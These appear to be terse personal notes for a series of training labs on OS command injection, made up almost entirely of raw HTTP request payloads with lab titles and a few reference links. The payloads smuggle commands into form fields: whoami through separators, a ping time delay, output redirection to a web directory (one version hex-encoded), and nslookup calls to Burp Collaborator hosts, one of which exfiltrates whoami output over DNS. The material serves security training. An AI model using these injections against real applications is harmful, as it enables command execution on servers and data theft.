### Lab: OS command injection, simple case

productId=2&storeId=1%3bwhoami

productId=2&storeId=1%26whoami

### Lab: Blind OS command injection with time delays

csrf=AYzHLaaNvV728ZkzmBurd35Y0IrwA1fm&name=asd&email=asd%40asd.com||ping+-c+10+127.0.0.1||&subject=asd&message=asd

### Lab: Blind OS command injection with output redirection

csrf=pledvhAi6eZf5pfoQJC3ieqP8xcEbxWV&name=asd&email=asd%40asd.com||%77%68%6f%61%6d%69%20%3e%20%2f%76%61%72%2f%77%77%77%2f%69%6d%61%67%65%73%2f%70%77%6e%2e%74%78%74||&subject=asd&message=asd

csrf=pledvhAi6eZf5pfoQJC3ieqP8xcEbxWV&name=asd&email=asd%40asd.com||whoami+>+/var/www/images/pwn2.txt||&subject=asd&message=asd

### Lab: Blind OS command injection with out-of-band interaction

csrf=tdKZU24PNnwsOHfWnbnvw63hCzE8RzPy&name=asd&email=asd%40asd.com||nslookup+in9xa9tupw8ma5bein2s1epuolubi0.burpcollaborator.net||&subject=asd&message=asd

https://notsosecure.com/out-band-exploitation-oob-cheatsheet

https://www.gb-advisors.com/out-of-band-vulnerabilities-what-are-they-and-how-can-be-prevented/#

https://portswigger.net/kb/issues/00100a00_out-of-band-resource-load-http

https://portswigger.net/burp/application-security-testing/oast

### Lab: Blind OS command injection with out-of-band data exfiltration

csrf=P2umQWDhEafmDNykWnGsE8mIfjyHD3LA&name=asd&email=asd%40asd.com||nslookup+`whoami`.lzo0mc5x1zkpm8nhuqevdh1x0o6fu4.burpcollaborator.net||&subject=asd&message=asd
